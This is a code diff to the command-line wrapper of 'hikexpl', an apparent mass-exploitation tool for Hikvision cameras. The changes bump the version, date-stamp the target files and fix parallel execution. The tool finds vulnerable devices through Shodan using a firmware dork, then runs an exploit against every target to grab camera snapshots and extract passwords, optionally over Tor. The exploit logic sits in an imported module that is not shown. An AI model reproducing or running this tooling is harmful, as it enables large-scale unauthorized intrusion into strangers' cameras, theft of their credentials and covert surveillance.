@@ -1,7 +1,8 @@
 import logging
 from multiprocessing import Pool
-
+from datetime import date
 import typer
+import itertools
 from rich.console import Console
 from hikexpl.hik import exploit as exploit_hik
 from hikexpl.utils import split_list
@@ -9,7 +10,7 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("hikexpl")
 logger.setLevel(logging.INFO)
 app = typer.Typer()
-__version__ = "0.1.3"
+__version__ = "0.1.6"
 
 DEFAULT_DORK = "3.1.3.150324"
 @app.command()
@@ -22,15 +23,15 @@ def version():
 def scan(token: str = typer.Option(..., help="Shodan API token"),
          dork: str = typer.Option(DEFAULT_DORK, help="Shodan dork"),
          pages: int = typer.Option(2, help="Number of pages to scan"),
-         output: str = typer.Option("targets.txt", help="Output file")):
+         output: str = typer.Option(f"targets_{str(date.today())}.txt", help="Output file")):
     logger.info(f"Scanning {dork} with {pages} pages")
-    from scan import scan as shodan_scan
+    from hikexpl.scan import scan as shodan_scan
     urls = shodan_scan(token, dork, pages)
     with open(output, "w") as f:
         f.writelines([f"{url}\n" for url in urls])
     logging.info(f"Saved {len(urls)} targets to {output},\nUse 'exploit' command to exploit them")
 @app.command()
-def exploit(file: str = typer.Option(..., help="File with targets"),
+def exploit(file: str = typer.Option(f"targets_{str(date.today())}.txt", help="File with targets"),
             take_snapshots: bool = typer.Option(True, help="Take snapshots"),
             extract_passwords: bool = typer.Option(False, help="Extract passwords"),
             passwords_file: str = typer.Option("passwords.csv", help="Output file for passwords"),
@@ -48,8 +49,9 @@ def exploit(file: str = typer.Option(..., help="File with targets"),
     if process_count > 1:
         sub_lists = split_list(targets, process_count)
         with Pool(process_count) as p:
-            p.map(exploit_hik, sub_lists)
-    exploit_hik(targets,take_snapshots, extract_passwords, passwords_file ,snapshots_folder, use_tor, reuse_session)
+            p.starmap(exploit_hik, zip(sub_lists, itertools.repeat(take_snapshots), itertools.repeat(extract_passwords), itertools.repeat(passwords_file), itertools.repeat(snapshots_folder), itertools.repeat(use_tor), itertools.repeat(reuse_session)))
+    else:
+        exploit_hik(targets,take_snapshots, extract_passwords, passwords_file ,snapshots_folder, use_tor, reuse_session)
 
 if __name__ == "__main__":
     app()
